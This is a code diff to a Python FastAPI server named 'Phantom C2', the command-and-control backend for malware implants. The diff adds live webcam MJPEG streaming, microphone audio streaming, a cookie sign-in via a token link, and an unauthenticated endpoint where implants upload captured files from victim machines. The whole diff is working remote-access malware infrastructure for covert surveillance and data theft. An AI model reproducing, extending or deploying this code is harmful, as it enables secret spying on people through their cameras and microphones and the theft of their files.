@@ -1,9 +1,9 @@
-import os, json, time, uuid, asyncio, base64, secrets
+import os, json, time, uuid, asyncio, base64, secrets, mimetypes, re
 from typing import Dict, List
 
 from fastapi import (FastAPI, WebSocket, WebSocketDisconnect, Request,
                      HTTPException, UploadFile, File, Form)
-from fastapi.responses import Response, FileResponse
+from fastapi.responses import Response, FileResponse, StreamingResponse
 from fastapi.staticfiles import StaticFiles
 import uvicorn
 
@@ -16,6 +16,14 @@ BASE = os.path.dirname(os.path.abspath(__file__))
 CFG = config.load()
 BOX = Box(bytes.fromhex(CFG["psk_hex"]))
 BUILDER = Builder(CFG["builder"], CFG["psk_hex"], CFG["public_url"])
+
+BLOB_DIR = os.path.join(CFG["data_dir"], "blobs")
+os.makedirs(BLOB_DIR, exist_ok=True)
+
+BOUNDARY = b"--phantomframe\r\n"
+MEDIA_TYPES = {".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
+               ".wav": "audio/wav", ".webm": "video/webm", ".mp4": "video/mp4",
+               ".gif": "image/gif"}
 
 app = FastAPI(title="Phantom C2", docs_url=None, redoc_url=None)
 
@@ -33,9 +41,11 @@ class Session:
         self.jitter = CFG["beacon"]["default_jitter"]
         self.note = ""
         self.tags: List[str] = []
-        self.cam = ""
         self.streams = {"cam": False, "mic": False}
-        self.cam_size = 0
+        self.cam_frame = b""
+        self.cam_subs: List[asyncio.Queue] = []
+        self.mic_subs: List[asyncio.Queue] = []
+        self.blobs: List[dict] = []
 
     def public(self):
         return {
@@ -43,8 +53,8 @@ class Session:
             "first_seen": self.first_seen, "last_seen": self.last_seen,
             "queued": len(self.queue), "history": self.history[-300:],
             "sleep": self.sleep, "jitter": self.jitter,
-            "note": self.note, "tags": self.tags, "cam": self.cam,
-            "streams": self.streams,
+            "note": self.note, "tags": self.tags, "streams": self.streams,
+            "blobs": self.blobs[-40:], "has_cam": bool(self.cam_frame),
             "alive": (time.time() - self.last_seen) < 30,
         }
 
@@ -67,10 +77,11 @@ async def broadcast(msg):
 
 # ---------------- middleware ----------------
 
-OPEN_PATHS = ("/beacon", "/socks/", "/api/media/push", "/healthz")
+OPEN_PATHS = ("/beacon", "/socks/", "/api/media/push", "/api/media/upload", "/healthz")
+TOKEN_COOKIE = "phantom_auth"
 
 
-def _authorized(headers, query: str = "") -> bool:
+def _authorized(headers, query: str = "", cookies: dict = None) -> bool:
     user, pwd = CFG["auth"]["user"], CFG["auth"]["pass"]
     if not user:
         return True
@@ -84,7 +95,10 @@ def _authorized(headers, query: str = "") -> bool:
                 and secrets.compare_digest(got_pass, pwd)):
             return True
     token = (query or "").strip()
-    return bool(token) and secrets.compare_digest(token, pwd)
+    if token and secrets.compare_digest(token, pwd):
+        return True
+    cookie = (cookies or {}).get(TOKEN_COOKIE, "")
+    return bool(cookie) and secrets.compare_digest(cookie, pwd)
 
 
 @app.middleware("http")
@@ -96,9 +110,16 @@ async def guard(request: Request, call_next):
         request.scope["raw_path"] = path.encode()
 
     if not path.startswith(OPEN_PATHS):
-        if not _authorized(request.headers, request.query_params.get("token", "")):
+        token = request.query_params.get("token", "")
+        if not _authorized(request.headers, token, request.cookies):
             return Response(b"auth required", 401,
                             {"WWW-Authenticate": 'Basic realm="phantom"'})
+        response = await call_next(request)
+        # a ?token= link signs the browser in for every sub-resource as well
+        if token and secrets.compare_digest(token, CFG["auth"]["pass"]):
+            response.set_cookie(TOKEN_COOKIE, token, httponly=True,
+                                samesite="lax", max_age=86400 * 7)
+        return response
     return await call_next(request)
 
 
@@ -144,25 +165,136 @@ async def beacon(request: Request):
                     media_type="application/octet-stream")
 
 
-# ---------------- live media from implant ----------------
+# ---------------- live media from implant (raw, no base64) ----------------
+
+def _fanout(subs, data):
+    for q in list(subs):
+        try:
+            q.put_nowait(data)
+        except asyncio.QueueFull:
+            pass
+
 
 @app.post("/api/media/push")
-async def media_push(body: dict):
-    sid = body.get("session_id") or ""
+async def media_push(request: Request, sid: str = "", kind: str = "cam",
+                     seq: int = 0, fmt: str = "jpeg"):
     s = SESSIONS.get(sid)
-    if not s:
+    data = await request.body()
+    if not s or not data:
         return {"ok": False}
-    kind = body.get("kind")
     if kind == "cam":
-        s.cam = body.get("b64", "")
-        s.cam_size = len(s.cam)
+        s.cam_frame = data
         s.streams["cam"] = True
+        _fanout(s.cam_subs, data)
     elif kind == "mic":
         s.streams["mic"] = True
-    await broadcast({"type": "stream", "session_id": sid,
-                     "kind": kind, "seq": body.get("seq"),
-                     "fmt": body.get("fmt"), "b64": body.get("b64", "")})
+        _fanout(s.mic_subs, data)
+    await broadcast({"type": "stream", "session_id": sid, "kind": kind,
+                     "seq": seq, "fmt": fmt, "size": len(data)})
     return {"ok": True}
+
+
+@app.get("/api/session/{sid}/cam.mjpg")
+async def cam_stream(sid: str):
+    s = SESSIONS.get(sid)
+    if not s:
+        raise HTTPException(404, "no session")
+    q: asyncio.Queue = asyncio.Queue(maxsize=8)
+    s.cam_subs.append(q)
+
+    async def gen():
+        try:
+            if s.cam_frame:
+                yield (BOUNDARY + b"Content-Type: image/jpeg\r\nContent-Length: "
+                       + str(len(s.cam_frame)).encode() + b"\r\n\r\n"
+                       + s.cam_frame + b"\r\n")
+            while True:
+                try:
+                    frame = await asyncio.wait_for(q.get(), timeout=20)
+                except asyncio.TimeoutError:
+                    return
+                yield (BOUNDARY + b"Content-Type: image/jpeg\r\nContent-Length: "
+                       + str(len(frame)).encode() + b"\r\n\r\n" + frame + b"\r\n")
+        finally:
+            if q in s.cam_subs:
+                s.cam_subs.remove(q)
+
+    return StreamingResponse(gen(), media_type="multipart/x-mixed-replace; boundary=phantomframe",
+                             headers={"Cache-Control": "no-store",
+                                      "X-Accel-Buffering": "no"})
+
+
+@app.get("/api/session/{sid}/cam.jpg")
+async def cam_snapshot(sid: str):
+    s = SESSIONS.get(sid)
+    if not s or not s.cam_frame:
+        raise HTTPException(404, "no frame")
+    return Response(s.cam_frame, media_type="image/jpeg",
+                    headers={"Cache-Control": "no-store"})
+
+
+@app.get("/api/session/{sid}/mic.pcm")
+async def mic_stream(sid: str):
+    s = SESSIONS.get(sid)
+    if not s:
+        raise HTTPException(404, "no session")
+    q: asyncio.Queue = asyncio.Queue(maxsize=64)
+    s.mic_subs.append(q)
+
+    async def gen():
+        try:
+            while True:
+                try:
+                    chunk = await asyncio.wait_for(q.get(), timeout=25)
+                except asyncio.TimeoutError:
+                    return
+                yield chunk
+        finally:
+            if q in s.mic_subs:
+                s.mic_subs.remove(q)
+
+    return StreamingResponse(gen(), media_type="application/octet-stream",
+                             headers={"Cache-Control": "no-store",
+                                      "X-Accel-Buffering": "no"})
+
+
+# ---------------- capture uploads (real files, no base64) ----------------
+
+def _safe_blob(name: str) -> str:
+    name = os.path.basename(name or "file.bin")
+    name = re.sub(r"[^A-Za-z0-9._-]+", "_", name).strip("._") or "file.bin"
+    return name[:80]
+
+
+@app.post("/api/media/upload")
+async def media_upload(request: Request, sid: str = "", kind: str = "file",
+                       name: str = ""):
+    s = SESSIONS.get(sid)
+    data = await request.body()
+    if not s or not data:
+        return {"ok": False}
+    fname = f"{uuid.uuid4().hex[:12]}-{_safe_blob(name)}"
+    with open(os.path.join(BLOB_DIR, fname), "wb") as fh:
+        fh.write(data)
+    ext = os.path.splitext(fname)[1].lower()
+    entry = {"url": f"/api/blobs/{fname}", "name": os.path.basename(name or fname),
+             "kind": kind, "size": len(data), "media": MEDIA_TYPES.get(ext, ""),
+             "ts": time.time()}
+    s.blobs.append(entry)
+    del s.blobs[:-200]
+    await broadcast({"type": "blob", "session_id": sid, "blob": entry})
+    return entry
+
+
+@app.get("/api/blobs/{name}")
+async def get_blob(name: str):
+    p = os.path.abspath(os.path.join(BLOB_DIR, os.path.basename(name)))
+    if not p.startswith(BLOB_DIR) or not os.path.isfile(p):
+        raise HTTPException(404, "no blob")
+    ext = os.path.splitext(p)[1].lower()
+    mt = MEDIA_TYPES.get(ext) or mimetypes.guess_type(p)[0] or "application/octet-stream"
+    dl = os.path.basename(p).split("-", 1)[-1]
+    return FileResponse(p, media_type=mt, filename=dl)
 
 
 # ---------------- dashboard API ----------------
@@ -359,7 +491,7 @@ async def _startup():
 
 @app.websocket("/ws")
 async def ws_endpoint(ws: WebSocket):
-    if not _authorized(ws.headers, ws.query_params.get("token", "")):
+    if not _authorized(ws.headers, ws.query_params.get("token", ""), ws.cookies):
         await ws.close(code=1008)
         return
     await ws.accept()
